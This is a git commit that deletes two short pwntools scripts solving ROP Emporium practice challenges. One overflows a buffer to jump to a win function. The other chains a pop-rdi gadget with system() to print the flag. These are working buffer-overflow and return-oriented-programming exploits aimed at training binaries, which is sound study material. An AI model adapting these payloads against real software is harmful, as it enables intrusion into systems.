887d6737ca6a996756534ecc04133981cf2a9848
spektre <84785848+SanjayVardhan@users.noreply.github.com>
2022-01-10 17:34:14 +0530

    Delete Origin/Scripts/ROPemporium directory

--- Origin/Scripts/ROPemporium/ret2win/ret2win.py
+++
@@ -1,6 +0,0 @@
-from pwn import *
-context.log_level = 'DEBUG'
-r = process("./ret2win")
-r.recv()
-r.write(cyclic(40)+p64(0x0000000000400756))
-r.recv()
--- Origin/Scripts/ROPemporium/split/split.py
+++
@@ -1,9 +0,0 @@
-from pwn import *
-context.log_level='DEBUG'
-r = process("./split")
-cat_flag = p64(0x00601060)
-system = p64(0x000000000040074b)
-pop_rdi = p64(0x00000000004007c3)
-payload = b'\x90'*40 + pop_rdi + cat_flag + system
-r.sendline(payload)
-r.recvall()
